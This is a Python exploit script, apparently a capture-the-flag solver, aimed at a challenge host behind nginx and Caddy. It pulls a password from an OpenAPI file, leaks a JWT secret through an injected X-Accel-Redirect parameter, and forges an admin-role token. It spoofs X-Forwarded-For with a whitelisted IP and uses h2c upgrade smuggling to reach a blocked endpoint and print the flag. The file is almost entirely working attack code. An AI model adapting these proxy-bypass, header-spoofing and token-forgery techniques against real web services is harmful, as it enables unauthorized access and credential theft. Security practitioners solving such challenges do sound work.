import base64
import hashlib
import hmac
import json
import re
import socket
import sys
import urllib.parse
import urllib.request
import urllib.error

try:
    from h2.connection import H2Connection
    from h2.config import H2Configuration
    from h2.events import ResponseReceived, DataReceived, StreamEnded
except ImportError:
    sys.exit("[!] Missing dependency: pip install h2")

HOST = "duck-smuzzle.v1t.site"
NGINX_BASE = f"http://{HOST}:81" # nginx 走 port 81 
SPOOF = "67.67.67.67"  # 白名單 ip

def http_get(path, headers=None):
    headers = headers or {}
    headers.setdefault("User-Agent", "Mozilla/5.0")
    headers.setdefault("X-Forwarded-For", SPOOF)
    req = urllib.request.Request(NGINX_BASE + path, headers=headers, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read().decode(errors="replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace"), dict(e.headers)

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def forge_jwt(secret: str) -> str:
    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = b64url(json.dumps({"role": "duck"}, separators=(",", ":")).encode())
    sig = b64url(hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest())
    return f"{header}.{payload}.{sig}"

def h2c_smuggle_duck(password: str, sid: str) -> str:
    """走 :80 用無害的 /flag 做 h2c upgrade，再在 stream 3 偷渡 /duck。"""
    s = socket.create_connection((HOST, 80), timeout=10)

    conn = H2Connection(config=H2Configuration(client_side=True, header_encoding="utf-8"))
    settings = conn.initiate_upgrade_connection()
    if isinstance(settings, bytes):
        settings = settings.decode()

    # 用這個因為這樣才不會被擋
    upgrade_req = (
        f"GET /flag?x=a&y=b&password={urllib.parse.quote(password)} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Connection: Upgrade, HTTP2-Settings\r\n"
        f"Upgrade: h2c\r\n"
        f"HTTP2-Settings: {settings}\r\n"
        f"User-Agent: Mozilla/5.0\r\n"
        f"\r\n"
    ).encode()
    s.sendall(upgrade_req)

    raw = b""
    while b"\r\n\r\n" not in raw:
        chunk = s.recv(4096)
        if not chunk:
            break
        raw += chunk
    if b"\r\n\r\n" not in raw:
        s.close()
        return "[!] incomplete upgrade response:\n" + raw.decode(errors="replace")

    head, leftover = raw.split(b"\r\n\r\n", 1)
    if b"101" not in head.split(b"\r\n", 1)[0]:
        s.close()
        return "[!] h2c upgrade failed:\n" + raw.decode(errors="replace")

    s.sendall(conn.data_to_send())

    bodies, ended, statuses = {}, set(), {}

    def feed(data: bytes):
        if not data:
            return
        for ev in conn.receive_data(data):
            if isinstance(ev, ResponseReceived):
                for k, v in ev.headers:
                    if k == ":status":
                        statuses[ev.stream_id] = v
            elif isinstance(ev, DataReceived):
                bodies.setdefault(ev.stream_id, b"")
                bodies[ev.stream_id] += ev.data
                conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)
            elif isinstance(ev, StreamEnded):
                ended.add(ev.stream_id)
        out = conn.data_to_send()
        if out:
            s.sendall(out)

    feed(leftover)

    # 把 stream 1（upgrade 用的 /flag）讀乾淨，讓 HPACK dynamic table 保持同步。
    s.settimeout(0.3)
    while True:
        try:
            data = s.recv(65535)
            if not data:
                break
            feed(data)
        except socket.timeout:
            break

    stream_id = 3
    conn.send_headers(
        stream_id,
        [
            (":method", "GET"),
            (":scheme", "http"),
            (":authority", HOST),
            (":path", f"/duck?password={password}"),
            ("x-forwarded-for", SPOOF),
            ("cookie", f"sid={sid}"),
            ("user-agent", "Mozilla/5.0"),
        ],
        end_stream=True,
    )
    s.sendall(conn.data_to_send())

    s.settimeout(10)
    while stream_id not in ended:
        try:
            data = s.recv(65535)
        except socket.timeout:
            break
        if not data:
            break
        feed(data)
    s.close()

    body = bodies.get(stream_id, b"").decode(errors="replace")
    status = statuses.get(stream_id, "?")
    return body or f"[!] empty body, status={status}"

def main():
    # 先拿密碼
    st, body, _ = http_get("/openapi.json")
    if st != 200:
        sys.exit(f"[!] /openapi.json failed: HTTP {st}\n{body[:500]}")
    opid = json.loads(body)["paths"]["/duck"]["get"]["operationId"]
    password = re.sub(r"_duck_get$", "", opid)
    print("[+] password    =", password)

    # 再拿 jwt secret
    q = urllib.parse.urlencode({"x": "X-Accel-Redirect", "y": "/private", "password": password})
    st, body, _ = http_get("/flag?" + q)
    m = re.search(r"JWT_SECRET=(.+)", body)
    if not m:
        sys.exit(f"[!] JWT_SECRET leak failed: HTTP {st}\n{body[:500]}")
    secret = m.group(1).strip()
    print("[+] JWT_SECRET  =", secret)

    # role 改成 duck
    sid = forge_jwt(secret)
    print("[+] forged sid  =", sid)

    # h2c smuggle /duck through Caddy on :80
    print("[*] h2c upgrade + smuggle on :80 ...")
    res = h2c_smuggle_duck(password, sid)
    m = re.search(r"v1t\{[^}]+\}", res)
    if m:
        print("[+] FLAG        =", m.group(0))
    else:
        print(res)

main()
